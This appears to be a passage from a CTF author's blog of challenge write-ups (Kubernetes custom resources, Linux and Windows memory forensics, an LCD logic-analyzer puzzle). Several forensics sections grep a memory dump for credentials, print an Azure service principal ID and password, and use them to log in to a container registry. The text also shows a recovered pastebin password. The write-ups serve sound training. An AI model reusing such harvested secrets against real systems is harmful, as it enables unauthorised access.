the structure and behavior of the new custom resource, including its name, attributes, and API endpoints. Once a CRD is defined, instances of the custom resource can be created and managed using Kubernetes tools like kubectl and the Kubernetes API.</p>\n<figure class=\"highlight bash\"><figcaption><span>api-resources</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl api-resources</span><br><span class=\"line\">NAME                              SHORTNAMES                                      APIVERSION                             NAMESPACED   KIND</span><br><span class=\"line\">bindings                                                                          v1                                     <span class=\"literal\">true</span>         Binding</span><br><span class=\"line\">componentstatuses                 cs                                              v1                                     <span class=\"literal\">false</span>        ComponentStatus</span><br><span class=\"line\">configmaps                        cm                                              v1                                     <span class=\"literal\">true</span>         ConfigMap</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">rolebindings                                                                      rbac.authorization.k8s.io/v1           <span class=\"literal\">true</span>         RoleBinding</span><br><span class=\"line\">roles                                                                             rbac.authorization.k8s.io/v1           <span class=\"literal\">true</span>         Role</span><br><span class=\"line\">priorityclasses                   pc                                              scheduling.k8s.io/v1                   <span class=\"literal\">false</span>        PriorityClass</span><br><span class=\"line\">ncscctfs                                                                          securinets.com/v1alpha1                <span class=\"literal\">true</span>         NCSCCtf</span><br></pre></td></tr></table></figure>\n<p>But wait! I am right! There is an api-group and a custom resource called ncscctfs!</p>\n<p>Now it’s time to get the flag!</p>\n<figure class=\"highlight bash\"><figcaption><span>get</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl get ncscctfs -n task4           </span><br><span class=\"line\">NAME   AGE</span><br><span class=\"line\">flag   17d</span><br></pre></td></tr></table></figure>\n<p>And yes there is a ncscctf resource named flag! Let’s describe that thing and get the flag!</p>\n<figure class=\"highlight bash\"><figcaption><span>describe</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl describe ncscctfs flag -n task4 </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://imgur.com/DhelAJU.png\" alt=\"\"></p>\n<p>Flag:  <code>Securinets&#123;CuSt0m_REs0urcEs_ArE_P0wErFul&#125;</code></p>\n<h1 id=\"final-words\"><a class=\"markdownIt-Anchor\" href=\"#final-words\">#</a> Final Words</h1>\n<p>In conclusion, the success of this event and competition is due in no small part to the dedication and hard work of the technical team. Their expertise and professionalism were instrumental in overcoming the various challenges we faced throughout the event lifecycle, and their tireless efforts ensured that we delivered a product that met the highest standards of quality and performance. On behalf of the team, I would like to express our sincere gratitude to our technical colleagues for their unwavering commitment to the project, and for their invaluable contributions to its success</p>\n","site":{"data":{}},"length":30277,"excerpt":"","more":"<p>The National Cyber Security Congress (NCSC) is a three-day event that brings together cyber security enthusiasts and experts. The event features a wide range of activities, including workshops, talks, conferences, and two exciting CTF competitions.</p>\n<p><img data-src=\"https://imgur.com/LJslRYb.png\" alt=\"\"></p>\n<p>As a technical team member, I had the chance to create challenges in Kubernetes, Digital Forensics, Misc, Hardware, and Game Hacking categories.</p>\n<p>The NCSC CTF provided a unique opportunity for cyber security enthusiasts to demonstrate their problem-solving abilities, teamwork, and technical proficiency in a fun and competitive environment. Overall, the event was an exciting and rewarding experience for all involved.</p>\n<p>In this blog, I will share some write-ups that players have requested!</p>\n<h1 id=\"digital-forensics-mokni-seals\"><a class=\"markdownIt-Anchor\" href=\"#digital-forensics-mokni-seals\">#</a> Digital Forensics : Mokni &amp; Seals</h1>\n<p><img data-src=\"https://i.imgur.com/i231apB.png\" alt=\"\"></p>\n<p>We got a zip file! I bet that file is a memory dump! So i tried to run the volatility imageinfo plugin but it takes a long time. So I tried to figure out if this file is Linux memory dump or not!</p>\n<figure class=\"highlight bash\"><figcaption><span>linux or win ?</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s: strings data.raw | grep <span class=\"string\">&quot;Linux version&quot;</span> </span><br><span class=\"line\">Linux version 5.8.0-43-generic (buildd@lcy01-amd64-018) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils <span class=\"keyword\">for</span> Ubuntu) 2.34) 49~20.04.1-Ubuntu SMP Fri Feb 5 09:57:56 UTC 2021 (Ubuntu 5.8.0-43.49~20.04.1-generic 5.8.18)</span><br></pre></td></tr></table></figure>\n<p>And yes it’s a Linux Memory dump! I guess its time to start finding/making a profile but let me check that is memory dump can be analyzed with a profile or not!</p>\n<figure class=\"highlight bash\"><figcaption><span>checking</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -i insmod       </span><br><span class=\"line\">sudo insmod ./lime-5.8.0-43-generic.ko path=../../Linux64.mem format=raw</span><br><span class=\"line\">sudo insmod ./lime-5.8.0-43-generic.ko <span class=\"string\">&quot;path=../../Linux64.mem format=raw&quot;</span></span><br><span class=\"line\">sudo insmod ./lime-5.8.0-43-generic.ko <span class=\"string\">&quot;path=../../Linux64.mem format=raw&quot;</span></span><br></pre></td></tr></table></figure>\n<p>Oh! The format is ram! which means that even if we get the correct profile volatility can’t analyze this memory dump! Strings time! The author want us to solve this mem dump using strings !</p>\n<p>Let’s try to figure out some command lines! Bash history! Let me show you this trick!</p>\n<figure class=\"highlight bash\"><figcaption><span>extract bash history</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei <span class=\"string\">&quot;@*:~\\\\$&quot;</span>     </span><br><span class=\"line\">raf-square@ubuntu:~$ vim /etc/containers/registries.conf</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">raf-square@ubuntu:~$ <span class=\"built_in\">echo</span> <span class=\"string\">&quot;This Is My Secret&quot;</span> &gt; secret.txt</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">raf-square@ubuntu:~$ podman login -u $(<span class=\"built_in\">head</span> -n 2 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>) -p $(<span class=\"built_in\">head</span> -n 3 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>)</span><br><span class=\"line\">raf-square@ubuntu:~$ podman pull nginx</span><br><span class=\"line\">^Craf-square@ubuntu:~$ <span class=\"built_in\">cd</span> LiME/src/</span><br><span class=\"line\">raf-square@ubuntu:~$ vim /etc/containers/registries.conf</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">raf-square@ubuntu:~$ vim /etc/containers/registries.conf</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">u:~$ podman login -u $(<span class=\"built_in\">head</span> -n 2 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>) -p $(<span class=\"built_in\">head</span> -n 3 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>Mmmm nice! now at least we got some commands and we got the user-name and host-name !<br>\nFrom these commands we can understand that the user edit  <code>/etc/containers/registries.conf</code> , then create a  <code>secret.txt</code> . Then logged in with podman using that secret.txt. But we don’t have any information about the content of the creds in these commands!.</p>\n<p>We have 2 methods to figure out what’s happen and get the creds!</p>\n<p>either running a strings and grepping on  <code>CMDLINE=podman login</code>  or grepping on  <code>This Is My Secret</code>  and check the lines before and after to see the content!</p>\n<figure class=\"highlight bash\"><figcaption><span>extract creds</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei <span class=\"string\">&quot;CMDLINE=podman login&quot;</span>       </span><br><span class=\"line\">_CMDLINE=podman login -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</span><br></pre></td></tr></table></figure>\n<p>OR</p>\n<figure class=\"highlight bash\"><figcaption><span>extract creds</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei -C 2 <span class=\"string\">&quot;This Is My Secret&quot;</span> </span><br><span class=\"line\"> Documents  LiME         Music     Public      Templates</span><br><span class=\"line\">Desktop  Downloads  Linux64.mem  Pictures  secret.txt  Videos</span><br><span class=\"line\">raf-square@ubuntu:~$ <span class=\"built_in\">echo</span> <span class=\"string\">&quot;This Is My Secret&quot;</span> &gt; secret.txt</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">fctt</span><br><span class=\"line\">--</span><br><span class=\"line\">application/octet-stream</span><br><span class=\"line\">text/plain</span><br><span class=\"line\">This Is My Secret</span><br><span class=\"line\">Service principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894</span><br><span class=\"line\">Service principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</span><br><span class=\"line\">--</span><br></pre></td></tr></table></figure>\n<p>So the creds are  <code>2ecf92b1-83a8-4355-8cb7-8354f4677894:fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</code></p>\n<p>But I didn’t think this is a normal creds for  <code>dockerhub</code>  or any public famous container registry! Espacially he pulled a container named nginx! I bet that nginx is a customized one and its a trick!</p>\n<p>Editing  <code>/etc/containers/registries.conf</code>  can confirm that change something! This configuration file used by the container runtime environment on Linux systems. This file specifies a list of container image registries that are trusted by the system and can be used to download container images.</p>\n<p>So let’s discover how to get the registry! Pulling nginx means he pulled the latest tag or at least he tried that! So let’s grep on  <code>nginx:latest</code></p>\n<figure class=\"highlight bash\"><figcaption><span>extract registry</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei <span class=\"string\">&quot;nginx:latest&quot;</span>  </span><br><span class=\"line\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span><br><span class=\"line\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span><br><span class=\"line\"><span class=\"string\">&quot;, &quot;</span>qualsk8s.azurecr.io/nginx:latest<span class=\"string\">&quot;) not found</span></span><br><span class=\"line\"><span class=\"string\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span></span><br><span class=\"line\"><span class=\"string\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span></span><br><span class=\"line\"><span class=\"string\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span></span><br></pre></td></tr></table></figure>\n<p>Bingo!  <code>qualsk8s.azurecr.io</code>  is the container registry! If you are an Azure guy you can get that from the previous step! when we get this output!</p>\n<figure class=\"highlight text\"><figcaption><span>creds</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Service principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894</span><br><span class=\"line\">Service principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</span><br></pre></td></tr></table></figure>\n<p>Ok it’s time to login and pull that image and run it!</p>\n<figure class=\"highlight bash\"><figcaption><span>login and pull</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker login qualsk8s.azurecr.io -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb </span><br><span class=\"line\"></span><br><span class=\"line\">docker pull nginx</span><br></pre></td></tr></table></figure>\n<p>After checking the image! I got that it’s a static web page so let’s run it!</p>\n<figure class=\"highlight bash\"><figcaption><span>run nginx</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --name chall -p 80:80 -d nginx </span><br></pre></td></tr></table></figure>\n<p>After running this container we got this web-page and guess what!! There is a flag icon! Let’s check it !<br>\n<img data-src=\"https://i.imgur.com/q3GSPiL.png\" alt=\"\"></p>\n<p>This flag icon lead you to this link  <code>https://pastebin.com/vjFtjMga</code>  which is protected pastebin<br>\nhow to get that password now! Let’s check the docker history!</p>\n<figure class=\"highlight bash\"><figcaption><span>docker history</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mohamed@RafSquare:~$ docker <span class=\"built_in\">history</span> qualsk8s.azurecr.io/nginx</span><br><span class=\"line\">IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT</span><br><span class=\"line\">093f65335d3a   13 days ago   ENTRYPOINT [<span class=\"string\">&quot;nginx&quot;</span> <span class=\"string\">&quot;-g&quot;</span> <span class=\"string\">&quot;daemon off;&quot;</span>]         0B        buildkit.dockerfile.v0</span><br><span class=\"line\">&lt;missing&gt;      13 days ago   RUN /bin/sh -c <span class=\"built_in\">chmod</span> +r -R . <span class=\"comment\"># buildkit         563kB     buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      13 days ago   RUN /bin/sh -c <span class=\"built_in\">mv</span> password.txt .hidden.txt <span class=\"comment\">#…   11B       buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      13 days ago   COPY ./ ./ <span class=\"comment\"># buildkit                           563kB     buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      3 weeks ago   RUN /bin/sh -c <span class=\"built_in\">rm</span> -rf ./* <span class=\"comment\"># buildkit            0B        buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      3 weeks ago   WORKDIR /usr/share/nginx/html                   0B        buildkit.dockerfile.v0</span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"built_in\">set</span> -x     &amp;&amp; apkArch=<span class=\"string\">&quot;<span class=\"subst\">$(cat /etc…   29.2MB</span></span></span><br><span class=\"line\"><span class=\"subst\"><span class=\"string\">&lt;missing&gt;      5 weeks ago   /bin/sh -c #(nop)</span>  ENV NJS_VERSION=0.7.9        0B</span></span><br><span class=\"line\"><span class=\"string\">&lt;missing&gt;      5 weeks ago   /bin/sh -c #(nop)  CMD [&quot;</span>nginx<span class=\"string\">&quot; &quot;</span>-g<span class=\"string\">&quot; &quot;</span>daemon…   0B</span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  STOPSIGNAL SIGQUIT           0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  EXPOSE 80                    0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  ENTRYPOINT [&quot;/docker-entr…   0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:e57eef017a414ca7…   4.62kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:abbcbf84dc17ee44…   1.27kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:5c18272734349488…   2.12kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:7b307b62e82255f0…   1.62kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"built_in\">set</span> -x     &amp;&amp; addgroup -g 101 -S …   4.45MB</span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  ENV PKG_RELEASE=1            0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  ENV NGINX_VERSION=1.23.3     0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  LABEL maintainer=NGINX Do…   0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  CMD [&quot;/bin/sh&quot;]              0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) ADD file:40887ab7c06977737…   7.05MB</span></span><br></pre></td></tr></table></figure>\n<p>And yes!! There is  <code>.hidden.txt</code>  that contain a password for sure ! let’s get that password!</p>\n<figure class=\"highlight bash\"><figcaption><span>docker exec</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it 460fc5a977c5 <span class=\"built_in\">cat</span> .hidden.txt</span><br><span class=\"line\">vT56X19Qu3</span><br></pre></td></tr></table></figure>\n<p>We got this pastebin !</p>\n<p><img data-src=\"https://i.imgur.com/N4B9j4z.png\" alt=\"\"></p>\n<p>This is will lead us to word sheet that contains a hex data!</p>\n<p><img data-src=\"https://i.imgur.com/P0hrYhX.png\" alt=\"\"></p>\n<p>The hex data seams introducing spaces and tabs! I don’t care let’s decode it and see what’s will be!<br>\nI’ll try to convert it to a file using  <code>xxd</code>  and import that file to <span class=\"exturl\" data-url=\"aHR0cDovL2Rjb2RlLmZy\">dcode.fr</span></p>\n<figure class=\"highlight bash\"><figcaption><span>xxd</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxd -r -p hex.txt &gt; result.txt</span><br></pre></td></tr></table></figure>\n<p>Yeah it’s a file that contains a lot of spaces! Its whitespaces</p>\n<p>Bingo! This is the flag  <code>Securinets&#123;208e5976c9d654e47d73ef44cabc272d&#125;</code></p>\n<h1 id=\"digital-forensics-recover-my-work\"><a class=\"markdownIt-Anchor\" href=\"#digital-forensics-recover-my-work\">#</a> Digital Forensics: Recover my Work 😦</h1>\n<p><img data-src=\"https://i.imgur.com/DWMzUMB.png\" alt=\"\"></p>\n<p>We got a file named  <code>memory.dmp</code> . It’s a memory dump for sure! Let’s run imageinfo plugin to get our profile!</p>\n<figure class=\"highlight bash\"><figcaption><span>profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp imageinfo</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br></pre></td></tr></table></figure>\n<p>But sadly we got this type of outpût! I bet that the suggested profile (in case it exists) will be wrong! Let’s know the exact profile with my own way! Let’s run strings the file and grep “service pack”</p>\n<figure class=\"highlight text\"><figcaption><span>Extract info</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows 7 Professional, 64-bit Service Pack 1 (Build 7601)</span><br></pre></td></tr></table></figure>\n<p>Cool, This build and service pack is supported by  <code>Win7SP1x64</code> ! I guess that imageinfo plugin got problem because the iso is customizated !</p>\n<p>Let’s start checking our memory dump! First thing should be checked is the running processes! I’ll use pstree for that thing!</p>\n<p><img data-src=\"https://i.imgur.com/1xA56pZ.png\" alt=\"\"></p>\n<p>MMMM intersting! Found chrome, firefox, outlook and RDP opened! what a trip! After digging on chrome history and firefox, I found rabbit holes and some links to wordlists! Bad Author (Me).</p>\n<p>Checking the consoles plugin too. Another rabbit hole! rabbit hole everywhere!</p>\n<p>It’s time to check and figure out that outlook process!<br>\nOutlook save the mails as pst or ost files! These files contains the mails data such as the message, attachements, sender/receiver information!</p>\n<p>So let’s try to extract these files !</p>\n<figure class=\"highlight bash\"><figcaption><span>check files</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp --profile=Win7SP1x64 filescan | grep -i pst$</span><br><span class=\"line\">0x000000007d81a490      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst</span><br><span class=\"line\">0x000000007dd59340      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst</span><br><span class=\"line\">0x000000007dd73220      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst</span><br><span class=\"line\">0x000000007e3f8b30      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst</span><br><span class=\"line\">0x000000007e5297a0      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst</span><br><span class=\"line\">0x000000007e5eee60     30      0 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst</span><br></pre></td></tr></table></figure>\n<p>After extracting the files using  <code>dumpfiles</code>  plugin and making sure that the files are safe and not corrupted. I opened them using a pst online viewer!</p>\n<p>The 1st mail i got it is from Adam! He send to me a zip file inside mega storage after our online meeting! I bet that zip is protected with that boring password</p>\n<p><img data-src=\"https://i.imgur.com/9a0GCzz.png\" alt=\"\"></p>\n<p>Ah my bad! The mega too is protected! We need the encryption key!</p>\n<p><img data-src=\"https://i.imgur.com/hEG0dsu.png\" alt=\"\"></p>\n<p>Let’s check the other mail! and as expected Adam forget to share the decryption key of the mega link to open the zip!</p>\n<p><img data-src=\"https://i.imgur.com/wB3m3QV.png\" alt=\"\"></p>\n<p>Bingo we got the zip! But it’s protected! Tried bruteforcing the password. But I failed!</p>\n<p>Mmmm Let’s think a little bit! The author said that he used to use the same password! We need to find another usage of that password to open the zip and get the flag!</p>\n<p>And It’s time to investigate the  <code>mstsc.exe</code>  or let’s just say the RDP! Remote Desktop?? Mmmm how to extract information from that thing?</p>\n<p>Let’s talk brievly! Extracting the memory part used by RDP can save our life! I’ll try to recover what the user see when he used RDP!!!</p>\n<p>Yes this possible dear reader, Don’t worry You’ll see how! Just make sure that you have  <code>Gimp</code></p>\n<p>Let’s now extract the memory part used by RDP process using the  <code>memdump</code>  plugin in volatility!</p>\n<figure class=\"highlight bash\"><figcaption><span>memdump</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp --profile=Win7SP1x64 memdump -p 360 -D .</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">************************************************************************</span><br><span class=\"line\">Writing mstsc.exe [   360] to 360.dmp</span><br></pre></td></tr></table></figure>\n<p>After getting that file! Let’s change its extension from  <code>.dmp</code>  to  <code>.data</code>  and open that file with gimp!</p>\n<p><img data-src=\"https://i.imgur.com/k3uwJ0M.png\" alt=\"\"></p>\n<p>Now it’s time for focusing! Yeah focusing will save your time! Many people can’t figure or recover images quickly! But believe me focusing on the noise will help you recover the data in a short time!</p>\n<p>After 4 mins of playing with offset and width i got it!</p>\n<p>Check the offset and the width!</p>\n<p><img data-src=\"https://i.imgur.com/wI2SQK7.png\" alt=\"\"></p>\n<p>Ohhh man! The user was opened <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuc2VjdXJpbmV0cy50bg==\">https://ctf.securinets.tn</span> (check it for know more information about our CTFs events xD ) and tried to secure a zip file with that shitty password!</p>\n<p>Finally This is the flag  <code>Securinets&#123;R3M0tE_DeSKtOp_1s_FunNy_!_!&#125;</code></p>\n<h1 id=\"hardware-liquid-display\"><a class=\"markdownIt-Anchor\" href=\"#hardware-liquid-display\">#</a> Hardware: Liquid Display</h1>\n<p><img data-src=\"https://i.imgur.com/YVrQJqG.png\" alt=\"\"></p>\n<p>We got an image and a data file!<br>\n<img data-src=\"https://i.imgur.com/5Enx08x.png\" alt=\"\"></p>\n<p>The image contains an LCD 16x2 SPI connected to something called  <code>WOKWI LOGIC</code></p>\n<p>After some searching I got that this component is a logic analyzer. But wait!! What is that??</p>\n<p>A logic analyzer is an electronic instrument that captures and displays multiple signals from a digital system or digital circuit. A logic analyzer may convert the captured data into timing diagrams, protocol decodes, state machine traces…</p>\n<p><img data-src=\"https://imgur.com/WEzP4bO.png\" alt=\"\"></p>\n<p>As my friend said this is the hardware wireshark xD</p>\n<p>So we can understand now that this circuit capture the signals of each pin of the LCD and the data file is the capture file that contains the files!</p>\n<p>So after some searching we get how to open that data file (which is a ASCII text file, I didn’t recommend to analyse it as text file).</p>\n<p>You can check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLndva3dpLmNvbS9ndWlkZXMvbG9naWMtYW5hbHl6ZXI=\">link</span> to get more information about the logic analyzer!</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaWdyb2sub3JnL3dpa2kvRG93bmxvYWRz\">PulseView</span> is an open source Logic Analyzer GUI belongs to The sigrok project that aims at creating a portable, cross-platform, Free/Libre/Open-Source signal analysis software suite that supports various device types</p>\n<p>I’ll use that Logic Analyzer GUI for this challenge!</p>\n<p><img data-src=\"https://imgur.com/6HyLxUY.png\" alt=\"\"></p>\n<p>Import the file data in this way! and let’s the show begin!</p>\n<p><img data-src=\"https://imgur.com/MLrvWUk.png\" alt=\"\"></p>\n<p>A lot of fun wait us right?! Don’t worry man! This is not that super hard! Just all what we need to do now is to simulate these signals manually! These signals are sent to the LCD and that LCD display something (It should be the flag!). So we need to understand how LCD works! I recommend to read the datasheet this thing!</p>\n<p>I will not re-write what the datasheet said! so read it! You should understand how the LCD dispaly chars!</p>\n<p><img data-src=\"https://imgur.com/vnZLXyb.png\" alt=\"\"></p>\n<p>Also don’t forget to check the instruction table and understand how these instruction works!</p>\n<p><img data-src=\"https://imgur.com/xsRciDM.png\" alt=\"\"></p>\n<p>Let’s just take an example of the 1st instruction! The  <code>Clear Display</code> . This instruction clear all the data and return the cursor to the original status! Ah yeah of course you must to understand that LCD have cursors, display modes …</p>\n<p>After understand how this LCD works it’s time to check how characters are written on that LCD!</p>\n<p><img data-src=\"https://imgur.com/5JQEtHj.png\" alt=\"\"></p>\n<p>This table will help us to convert the signals to chars and recover our flag!</p>\n<p>After reading the datasheet. You will understand that the D0 (that correspond to RS pin) can help you to understand when the 